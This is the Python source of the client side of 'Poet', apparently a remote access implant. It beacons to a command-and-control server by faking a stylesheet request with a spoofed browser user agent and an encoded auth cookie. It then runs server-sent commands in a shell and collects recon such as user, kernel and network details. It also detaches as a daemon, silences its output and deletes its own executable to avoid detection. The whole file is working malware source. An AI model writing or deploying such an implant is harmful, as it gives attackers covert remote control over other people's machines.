#!/usr/bin/python2.7

import os
import sys
import time
import base64
import socket
import os.path
import urllib2
import argparse
import subprocess as sp

import debug
import module
import config as CFG
from poetsocket import *

UA = 'Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11'

if __file__.endswith('.py'):
    CLIENT_PATH = os.path.abspath(__file__)
else:
    CLIENT_PATH = os.path.dirname(os.path.abspath(__file__))


class PoetSocketClient(PoetSocket):
    def __init__(self, host, port):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((host, port))
        super(PoetSocketClient, self).__init__(self.s)


class PoetClient(object):
    """Core client functionality.

    Receives commands from server, does bidding, responds.

    Note: In any function with `inp' as a parameter, `inp' refers to the
    command string sent from the server.

    Attributes:
        host: server ip address
        port: server port
    """

    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.s = None

    def start(self):
        """Core Poet client functionality."""

        self.s = PoetSocketClient(self.host, self.port)
        while True:
            try:
                found = False
                inp = self.s.recv()

                if inp == 'fin':
                    found = True
                    break

                for cmd, func in module.client_commands.iteritems():
                    if inp.split()[0] == cmd:
                        found = True
                        try:
                            func(self, inp)
                        except Exception as e:
                            self.s.send(str(e.args))

                if not found:
                    self.s.send('Unrecognized')
            except socket.error as e:
                if e.message == 'too much data!':
                    self.s.send('posh : ' + e.message)
                else:
                    raise
        self.s.close()

    def recon(self):
        """Executes recon commands."""

        ipcmd = 'ip addr' if 'no' in self.cmd_exec('which ifconfig') else 'ifconfig'
        exec_str = 'exec "whoami" "id" "uname -a" "lsb_release -a" "{}" "w" "who -a"'.format(ipcmd)
        return self.execute(exec_str)

    def selfdestruct(self):
        """Trampoline to execute real, global selfdestruct function. It's
        global because it can be called in main. This exists so selfdestruct
        can be implemented as a module.
        """

        selfdestruct()

    def get_args_interval(self):
        """Helper function for chint module.
        """

        return args.interval

    def set_args_interval(self, new_interval):
        """Helper function for chint module.
        """

        args.interval = new_interval

    def cmd_exec(self, cmd):
        """Light wrapper over subprocess.Popen() for executing a command,
        blocking on it, and returning stdout/stderr
        """

        return sp.Popen(cmd, stdout=sp.PIPE, stderr=sp.STDOUT,
                        shell=True).communicate()[0]


def get_args():
    """ Parse arguments and return dictionary. """

    parser = argparse.ArgumentParser()
    if CFG.SERVER_IP is None:
        parser.add_argument('server', metavar='IP', type=str, help='Poet Server')
    if CFG.BEACON_INTERVAL is None:
        parser.add_argument('interval', metavar='INTERVAL', type=int,
                            help='Beacon Interval, in seconds. Default: 600',
                            nargs='?', default=600)
    parser.add_argument('-p', '--port')
    parser.add_argument('--debug', action="store_true",
                        help="show debug messages. implies --no-daemon")
    parser.add_argument('--no-daemon', action='store_true',
                        help="don't daemonize")
    parser.add_argument('--no-selfdestruct', action='store_true',
                        help="don't selfdestruct")
    return parser.parse_args()


def is_active(host, port):
    """Check if server is active.

    Send HTTP GET for a fake /style.css which server will respond to if it's
    alive.

    Args:
        host: server ip address
        port: server port

    Returns:
        Boolean for server state.
    """

    try:
        url = 'http://{}:{}/style.css'.format(host, port)
        headers = {
            'User-Agent': UA,
            'Cookie': 'c={};'.format(base64.b64encode(CFG.AUTH))
        }
        req = urllib2.Request(url, headers=headers)
        f = urllib2.urlopen(req)
        if f.code == 200:
            return True
        # shouldn't get here
        return False
    except urllib2.URLError:
        return False


def selfdestruct():
    """Delete client executable from disk.
    """

    if os.path.exists(CLIENT_PATH):
        os.remove(CLIENT_PATH)


def daemonize():
    """Daemonize client.
    http://www.jejik.com/articles/2007/02/a_simple_unix_linux_daemon_in_python/
    """

    # already a daemon?
    if os.getppid() == 1:
        return

    # break out of shell
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError:
        # silently faily
        sys.exit(1)

    # standard decoupling
    os.setsid()     # detach from terminal
    os.umask(0022)  # not really necessary, client isn't creating files
    os.chdir('/')   # so we don't block a fs from unmounting

    # denature std fd's
    si = file('/dev/null', 'r')
    so = file('/dev/null', 'a+')
    se = file('/dev/null', 'a+', 0)
    os.dup2(si.fileno(), sys.stdin.fileno())
    os.dup2(so.fileno(), sys.stdout.fileno())
    os.dup2(se.fileno(), sys.stderr.fileno())


def main():
    global args
    args = get_args()
    if CFG.SERVER_IP is not None:
        args.server = CFG.SERVER_IP
    if CFG.BEACON_INTERVAL is not None:
        args.interval = CFG.BEACON_INTERVAL

    # dynamically load all modules. needs to be before daemonize because it
    # needs to be able to open itself to find modindex.txt in package.c
    # daemonize changes the cwd so the open won't work.
    module.load_modules()

    # daemonize if we're not in --no-daemon or --debug mode
    if not args.no_daemon and not args.debug:
        daemonize()

    # disable debug messages if we're not in --debug
    if not args.debug:
        debug.disable()

    if not args.no_selfdestruct:
        debug.info('Deleting client')
        try:
            selfdestruct()
        except Exception as e:
            # fatal
            sys.exit(0)

    HOST = args.server
    PORT = int(args.port) if args.port else 443

    debug.info(('Poet started with interval of {} seconds to port {}. Ctrl-c to exit').format(args.interval, PORT))

    try:
        while True:
            if is_active(HOST, PORT):
                debug.info('Server is active')
                PoetClient(HOST, PORT).start()
            else:
                debug.warn('Server is inactive')
            time.sleep(args.interval)
    except KeyboardInterrupt:
        print
        debug.err('Poet terminated')
    except Exception as e:
        debug.warn('Fatal error: {}'.format(e.message))
        debug.err('Poet terminated')
        sys.exit(0)

if __name__ == '__main__':
    main()
